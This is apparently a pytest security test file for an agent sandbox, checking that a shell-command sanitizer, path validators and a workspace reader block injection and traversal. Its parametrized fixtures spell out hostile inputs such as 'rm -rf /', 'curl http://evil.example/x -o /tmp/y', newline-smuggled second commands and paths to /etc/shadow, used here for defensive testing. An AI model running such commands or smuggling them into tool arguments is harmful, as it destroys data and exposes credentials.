"""Comprehensive security tests for sandbox runners and workspace path validation."""

from __future__ import annotations

import time
from pathlib import Path

import pytest

from delegatron.sandbox.base import UnsafeCommandError, sanitize_shell_command
from delegatron.sandbox.docker_runner import (
    DockerSandbox,
    _validate_sandbox_path,
)
from delegatron.sandbox.e2b_runner import E2BSandbox
from delegatron.workspace import Workspace

# ---------------------------------------------------------------------------
# 1. Command sanitization tests (sanitize_shell_command)
# ---------------------------------------------------------------------------


class TestSanitizeShellCommand:
    """sanitize_shell_command fails closed: a blocked command never runs in any form."""

    @pytest.mark.parametrize(
        "cmd",
        [
            "pytest; rm -rf /",
            "pytest | cat /etc/passwd",
            "pytest && curl evil.com",
            "pytest$(whoami)",
            "pytest`whoami`",
            "pytest > /etc/passwd",
            "pytest < /dev/zero",
            "pytest & background",
            "../../bin/sh",
            "pytest\\n",
            "pytest\nrm -rf /",  # a real newline starts a second command
            "pytest tests/\ncurl http://evil.example/x -o /tmp/y",
            "pytest\rrm -rf /",
            "pytest\x00rm",
            "pytest\x1b[2J",
        ],
    )
    def test_unsafe_command_raises(self, cmd: str) -> None:
        with pytest.raises(UnsafeCommandError, match="Blocked unsafe command") as exc_info:
            sanitize_shell_command(cmd)
        assert isinstance(exc_info.value, ValueError)

    def test_normal_pytest_allowed(self) -> None:
        result = sanitize_shell_command("pytest tests/")
        assert result == "pytest tests/"

    def test_surrounding_newline_is_trimmed_and_tab_allowed(self) -> None:
        assert sanitize_shell_command("pytest tests/\n") == "pytest tests/"
        assert sanitize_shell_command("pytest\t-v") == "pytest\t-v"

    def test_normal_python_command_allowed(self) -> None:
        result = sanitize_shell_command("python -m pytest -v")
        assert result == "python -m pytest -v"

    def test_pip_install_allowed(self) -> None:
        result = sanitize_shell_command('pip install -e ".[dev]"')
        assert result == 'pip install -e ".[dev]"'

    def test_empty_command_returns_noop(self) -> None:
        result = sanitize_shell_command("")
        assert result == "true"

    def test_whitespace_only_returns_noop(self) -> None:
        result = sanitize_shell_command("   ")
        assert result == "true"


# ---------------------------------------------------------------------------
# 2. Path validation tests for Docker (_validate_sandbox_path)
# ---------------------------------------------------------------------------


class TestValidateSandboxPath:
    """Test that _validate_sandbox_path blocks path traversal."""

    def test_traversal_with_dotdot_raises(self, tmp_path: Path) -> None:
        sandbox_dir = tmp_path / "sandbox"
        sandbox_dir.mkdir()
        with pytest.raises(ValueError, match="Path escapes sandbox"):
            _validate_sandbox_path(sandbox_dir, "../../../etc/passwd")

    def test_absolute_path_raises(self, tmp_path: Path) -> None:
        sandbox_dir = tmp_path / "sandbox"
        sandbox_dir.mkdir()
        with pytest.raises(ValueError, match="Path escapes sandbox"):
            _validate_sandbox_path(sandbox_dir, "/etc/passwd")

    def test_valid_relative_path(self, tmp_path: Path) -> None:
        sandbox_dir = tmp_path / "sandbox"
        sandbox_dir.mkdir()
        result = _validate_sandbox_path(sandbox_dir, "src/main.py")
        assert result == (sandbox_dir / "src" / "main.py").resolve()

    def test_traversal_hidden_in_relative(self, tmp_path: Path) -> None:
        sandbox_dir = tmp_path / "sandbox"
        sandbox_dir.mkdir()
        with pytest.raises(ValueError, match="Path escapes sandbox"):
            _validate_sandbox_path(sandbox_dir, "src/../../../etc/passwd")

    def test_simple_filename(self, tmp_path: Path) -> None:
        sandbox_dir = tmp_path / "sandbox"
        sandbox_dir.mkdir()
        result = _validate_sandbox_path(sandbox_dir, "README.md")
        assert result == (sandbox_dir / "README.md").resolve()


# ---------------------------------------------------------------------------
# 3. Path validation tests for E2B (_validate_e2b_path)
# ---------------------------------------------------------------------------


class TestValidateE2BPath:
    """Test that E2BSandbox._validate_e2b_path blocks escapes."""

    def test_dotdot_rejected(self) -> None:
        with pytest.raises(ValueError, match="Path traversal not allowed"):
            E2BSandbox._validate_e2b_path("../secret")

    def test_absolute_path_rejected(self) -> None:
        with pytest.raises(ValueError, match="Absolute path not allowed"):
            E2BSandbox._validate_e2b_path("/absolute/path")

    def test_valid_relative_path(self) -> None:
        # Should not raise
        E2BSandbox._validate_e2b_path("src/main.py")

    def test_nested_dotdot_rejected(self) -> None:
        with pytest.raises(ValueError, match="Path traversal not allowed"):
            E2BSandbox._validate_e2b_path("src/../../etc/passwd")

    def test_deep_valid_path(self) -> None:
        # Should not raise
        E2BSandbox._validate_e2b_path("src/delegatron/agents/base.py")


# ---------------------------------------------------------------------------
# 4. Workspace read_file traversal tests
# ---------------------------------------------------------------------------


class TestWorkspaceReadFileTraversal:
    """Test that Workspace.read_file blocks path traversal."""

    def test_traversal_raises(self, tmp_path: Path) -> None:
        # Create a minimal workspace (no git needed for read_file)
        ws = Workspace.__new__(Workspace)
        ws.repo_path = tmp_path
        ws.run_id = "test"
        ws.base_branch = "main"
        ws._branch = ""
        ws._initial_sha = ""

        with pytest.raises(ValueError, match="Path traversal denied"):
            ws.read_file("../../../etc/passwd")

    def test_normal_file_read(self, tmp_path: Path) -> None:
        # Create a workspace with a file
        ws = Workspace.__new__(Workspace)
        ws.repo_path = tmp_path
        ws.run_id = "test"
        ws.base_branch = "main"
        ws._branch = ""
        ws._initial_sha = ""

        test_file = tmp_path / "hello.txt"
        test_file.write_text("hello world")

        content = ws.read_file("hello.txt")
        assert content == "hello world"

    def test_nonexistent_file_returns_none(self, tmp_path: Path) -> None:
        ws = Workspace.__new__(Workspace)
        ws.repo_path = tmp_path
        ws.run_id = "test"
        ws.base_branch = "main"
        ws._branch = ""
        ws._initial_sha = ""

        result = ws.read_file("nonexistent.txt")
        assert result is None

    def test_nested_traversal_raises(self, tmp_path: Path) -> None:
        ws = Workspace.__new__(Workspace)
        ws.repo_path = tmp_path
        ws.run_id = "test"
        ws.base_branch = "main"
        ws._branch = ""
        ws._initial_sha = ""

        with pytest.raises(ValueError, match="Path traversal denied"):
            ws.read_file("src/../../../../../../etc/shadow")


# ---------------------------------------------------------------------------
# 5. Docker host fallback refusal test
# ---------------------------------------------------------------------------


class TestDockerHostFallbackRefusal:
    """Test that _run_local refuses to execute on the host."""

    def test_run_local_returns_failed_report(self, tmp_path: Path) -> None:
        sandbox = DockerSandbox(workspace_root=tmp_path)
        start_time = time.monotonic()

        result = sandbox._run_local(
            sandbox_dir=tmp_path,
            patch={"test_commands": ["pytest"]},
            start_time=start_time,
        )

        assert result["passed"] is False
        assert "Docker is required but not available" in result["stderr"]
        assert result["total"] == 0
        assert result["failures"] == 0
        assert result["duration_ms"] >= 0

    def test_run_local_does_not_execute_commands(self, tmp_path: Path) -> None:
        """Ensure _run_local never calls subprocess for test commands."""
        sandbox = DockerSandbox(workspace_root=tmp_path)

        # Create a marker file; if commands ran, they could delete it
        marker = tmp_path / "marker.txt"
        marker.write_text("intact")

        start_time = time.monotonic()
        result = sandbox._run_local(
            sandbox_dir=tmp_path,
            patch={"test_commands": ["rm marker.txt"]},
            start_time=start_time,
        )

        assert result["passed"] is False
        # Marker file should still exist (commands were not executed)
        assert marker.read_text() == "intact"
